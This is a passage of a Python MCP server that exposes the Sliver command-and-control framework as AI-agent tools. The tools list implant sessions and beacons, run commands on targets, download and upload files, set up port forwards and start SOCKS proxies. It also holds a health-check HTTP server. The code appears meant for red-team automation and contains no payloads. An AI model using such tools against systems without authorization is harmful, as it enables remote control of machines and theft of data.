        "title": "List Active Sessions",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True
    }
)
async def sliver_sessions_list(params: SessionsListInput) -> str:
    """List all active Sliver sessions.

    Returns active session implants connected to the Sliver server.

    Args:
        params (SessionsListInput): Validated input parameters containing:
            - response_format (ResponseFormat): Output format (json/markdown)

    Returns:
        str: JSON or Markdown formatted list of active sessions
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.list_sessions()

        if params.response_format == ResponseFormat.MARKDOWN:
            return _format_sessions_markdown(result)
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_sessions_list failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_beacons_list",
    annotations={
        "title": "List Active Beacons",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True
    }
)
async def sliver_beacons_list(params: BeaconsListInput) -> str:
    """List all active Sliver beacons.

    Returns active beacon implants connected to the Sliver server.

    Args:
        params (BeaconsListInput): Validated input parameters containing:
            - response_format (ResponseFormat): Output format (json/markdown)

    Returns:
        str: JSON or Markdown formatted list of active beacons
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.list_beacons()

        if params.response_format == ResponseFormat.MARKDOWN:
            return _format_beacons_markdown(result)
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_beacons_list failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_execute",
    annotations={
        "title": "Execute Command",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def sliver_execute(params: ExecuteInput) -> str:
    """Execute a command on a Sliver session.

    Runs a command on the target system through the specified session.

    Args:
        params (ExecuteInput): Validated input parameters containing:
            - session_id (str): Session ID to execute on
            - command (str): Command/executable to run
            - args (List[str]): Command arguments
            - output (bool): Capture command output

    Returns:
        str: JSON-formatted response:
            {
                "session_id": str,
                "command": str,
                "args": list,
                "stdout": str,
                "stderr": str,
                "status": int,
                "executed_at": str
            }
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.execute(
            session_id=params.session_id,
            command=params.command,
            args=params.args,
            output=params.output
        )
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_execute failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_download",
    annotations={
        "title": "Download File",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def sliver_download(params: DownloadInput) -> str:
    """Download a file from a Sliver session.

    Downloads a file from the target system to /artifacts/downloads/.

    Args:
        params (DownloadInput): Validated input parameters containing:
            - session_id (str): Session ID to download from
            - remote_path (str): Path to file on target
            - filename (Optional[str]): Local filename override

    Returns:
        str: JSON-formatted response:
            {
                "success": bool,
                "session_id": str,
                "remote_path": str,
                "local_path": str,
                "sha256": str,
                "size_bytes": int,
                "downloaded_at": str
            }
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.download(
            session_id=params.session_id,
            remote_path=params.remote_path,
            filename=params.filename
        )
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_download failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_upload",
    annotations={
        "title": "Upload File",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def sliver_upload(params: UploadInput) -> str:
    """Upload a file to a Sliver session.

    Uploads a local file to the target system through the session.

    Args:
        params (UploadInput): Validated input parameters containing:
            - session_id (str): Session ID to upload to
            - local_path (str): Path to local file
            - remote_path (str): Destination path on target

    Returns:
        str: JSON-formatted response:
            {
                "success": bool,
                "session_id": str,
                "local_path": str,
                "remote_path": str,
                "sha256": str,
                "size_bytes": int,
                "uploaded_at": str
            }
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.upload(
            session_id=params.session_id,
            local_path=params.local_path,
            remote_path=params.remote_path
        )
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except FileNotFoundError as e:
        return json.dumps({"error": "file_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_upload failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_portfwd_add",
    annotations={
        "title": "Add Port Forward",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def sliver_portfwd_add(params: PortfwdAddInput) -> str:
    """Add a port forward through a Sliver session.

    Creates a port forward from a local port through the session to a remote host:port.

    Args:
        params (PortfwdAddInput): Validated input parameters containing:
            - session_id (str): Session ID
            - local_port (int): Local port to listen on
            - remote_host (str): Remote host to forward to
            - remote_port (int): Remote port to forward to

    Returns:
        str: JSON-formatted response:
            {
                "success": bool,
                "session_id": str,
                "local_port": int,
                "remote_host": str,
                "remote_port": int,
                "created_at": str
            }
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.portfwd_add(
            session_id=params.session_id,
            local_port=params.local_port,
            remote_host=params.remote_host,
            remote_port=params.remote_port
        )
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_portfwd_add failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_socks_start",
    annotations={
        "title": "Start SOCKS Proxy",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def sliver_socks_start(params: SocksStartInput) -> str:
    """Start a SOCKS proxy through a Sliver session.

    Creates a SOCKS5 proxy listener that routes traffic through the session.

    Args:
        params (SocksStartInput): Validated input parameters containing:
            - session_id (str): Session ID
            - port (int): Local port for SOCKS proxy (default: 1080)

    Returns:
        str: JSON-formatted response:
            {
                "success": bool,
                "session_id": str,
                "port": int,
                "created_at": str
            }
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.socks_start(
            session_id=params.session_id,
            port=params.port
        )
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_socks_start failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


# =============================================================================
# HTTP Health Check Server
# =============================================================================

async def start_health_http_server():
    """Start a simple HTTP server for health checks.

    Provides:
    - /health - Health check endpoint
    - /status - Detailed connection status
    """
    from aiohttp import web

    async def handle_health(request):
        return web.json_response({
            "status": "ok",
            "sliver_available": SLIVER_AVAILABLE
        })

    async def handle_status(request):
        sliver = get_client()
        return web.json_response({
            "connected": sliver.connected,
            "config_path": sliver.config_path,
            "init_attempted": sliver._init_attempted,
            "init_error": sliver._init_error
        })

    app = web.Application()
    app.router.add_get('/health', handle_health)
    app.router.add_get('/status', handle_status)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 9996)
    await site.start()
    logger.info("Health HTTP server started on port 9996")


# =============================================================================
# Main Entry Point
# =============================================================================

async def main_with_http():
    """Main entry point with HTTP server for health checks."""
    logger.info("Sliver MCP server starting...")

    # Attempt connection to Sliver server
    await ensure_client_connected()

    # Start HTTP server for health checks (non-blocking)
    try:
        asyncio.create_task(start_health_http_server())
    except Exception as e:
        logger.warning(f"Failed to start health HTTP server: {e}")

    # Run MCP server via stdio (MetaMCP spawns as subprocess)
    await mcp.run_stdio_async()


if __name__ == '__main__':
    asyncio.run(main_with_http())
